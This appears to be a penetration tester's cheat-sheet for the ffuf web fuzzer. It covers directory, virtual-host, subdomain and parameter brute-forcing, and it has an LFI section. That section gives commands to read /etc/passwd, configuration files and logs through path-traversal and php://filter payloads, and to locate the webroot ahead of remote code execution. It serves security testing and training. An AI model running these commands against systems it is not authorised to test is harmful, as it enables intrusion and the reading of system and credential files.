+++
title = "ffuf"
+++

Fast web fuzzer `ffuf` is best used for Virtual Host (VHOST) Discovery, Parameter Fuzzing, and API Testing. Use `feroxbuster` for web file and directory brute-forcing.

When fuzzing for file extensions, try to discern (or guess by searching for `index.*`) to ascertain the web technologies used (i.e. PHP for Apache or ASPX for IIS, etc.)

**References:**
- https://github.com/ffuf/ffuf?tab=readme-ov-file#usage

## Important Options

**URL Encoding (e.g. for command injection payloads)**
```bash
  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'
```

```bash
HTTP OPTIONS:
  -H               Header "Name: Value", separated by colon. Multiple -H flags are accepted.
  -X               HTTP method to use (default: GET)
  -b               Cookie data "NAME1=VALUE1; NAME2=VALUE2" for copy as curl functionality.
  -d               POST data
  -recursion       Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth Maximum recursion depth. (default: 0)
  -u               Target URL

MATCHER OPTIONS:
  -mc              Match HTTP status codes, or "all" for everything. (default: 200,204,301,302,307,401,403)
  -ms              Match HTTP response size

FILTER OPTIONS:
  -fc              Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fs              Filter HTTP response size. Comma separated list of sizes and ranges

INPUT OPTIONS:
  -w               Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'
  -ic              Ignore comments in wordlist

OUTPUT OPTIONS:
  -o               Write output to file

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v
```

## Wordlists

- Dir/File: `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt`
- Extensions: `/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt`
- Subdomains: `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- URL Parameters: `/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt`
- Users:
    - Quick: `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
    - Comprehensive: `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`

## Commands

### Find file extension

Although not perfect, most base pages will use `index` with the appropriate technology extension... this can help find some secrets

```bash
# NOTE: already includes '.' so do not add to -u
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<TARGET>/indexFUZZ
```

### Search file extensions

This searches for `.php` files

```bash
# NOTE: -v is needed to show full path
ffuf -ic -recursion -recursion-depth 1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e .php -u http://<TARGET>/FUZZ -v
```

### vHost Brute-Force

Only changes HTTP `Host:` header. Careful with the SECURE in http`S` if the website is not plain HTTP.

```bash
# NOTE: filter out by response size since an HTTP response of 200 OK will always be received
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H 'Host: FUZZ.<DOMAIN>' -u http://<TARGET>/ -fs <SIZE>

ffuf -ic -w /usr/share/seclists/Discovery/DNS/services-names.txt:FUZZ -H 'Host: FUZZ.<DOMAIN>' -u http://<TARGET>/ -fs <SIZE>

# Add NEW vHosts to automatically resolve them later
echo '<IP_ADDR> <VHOST>.<FQDN>' | sudo tee -a /etc/hosts
```

### Subdomain Brute-Force

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.<DOMAIN>
```

### Parameter fuzzing

#### Quick

- https://github.com/s0md3v/Arjun

Arjun will attempt to discover all parameters.

```bash
uv tool install arjun

arjun -t 8 -oT arjun_parameter_get.txt -w large -m GET -u http://<TARGET>
arjun -t 8 -oT arjun_parameter_post.txt -w large -m POST -u http://<TARGET>
```

#### GET

```bash
# NOTE: filter out by response size since an HTTP response of 200 OK will always be received
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<TARGET>/<PAGE>?FUZZ=value -fs <SIZE>
```

#### POST

```bash
# NOTE: filter out by response size since an HTTP response of 200 OK will always be received
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=value' -fs <SIZE>
```

### Value fuzzing

For HTTP `GET` requests, remove the `-X` and `-d` options and incorporate the `PARAM=value` into the `-u` URL.

Try other wordlists to make sure they make sense for the `PARAM`.

```bash
### IDs
# Might require custom wordlist like ids for instance
for i in $(seq 1 100000) ; do echo $i >> ids.txt ; done
# Fuzz
ffuf -w <CUSTOM_WORDLIST>:FUZZ -u http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '<PARAM>=FUZZ' -fs <SIZE>

### USERNAMES
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ -u http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '<PARAM>=FUZZ' -fs <SIZE>
```

```bash
# Access via curl (POST)
curl http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '<PARAM>=<VALUE>'
```

## LFI

Fuzzes a parameter with hundreds of `/etc/passwd` traversal permutations including encoding bypasses, null bytes, and double encoding. First identify the vulnerable parameter by testing pages that load dynamic content (e.g. `?page=`, `?file=`, `?lang=`, `?view=`), then look for parameters whose value matches a filename or path.

### Linux

**Tests many types of bypasses (nested, encoded, null bytes):**
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>
```

**For when files are executed instead of being read:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>
```

**Once confirmed, fuzz for accessible config files, logs, and sensitive paths:**
```bash
# NOTE: <LFI_TRAVERSAL> is not always needed
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
```

#### Find Webroot

- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

After discovering an LFI, getting the webroot is critical to enumerating more config files (before getting RCE)

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/<PAGE>?<PARAM>=../../../../FUZZ/index.php' -fs <SIZE>
```

### Windows

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=FUZZ' -fs 0
```

Once confirmed, fuzz for accessible config files, logs, and sensitive paths:

- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows-LFI-files.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
```
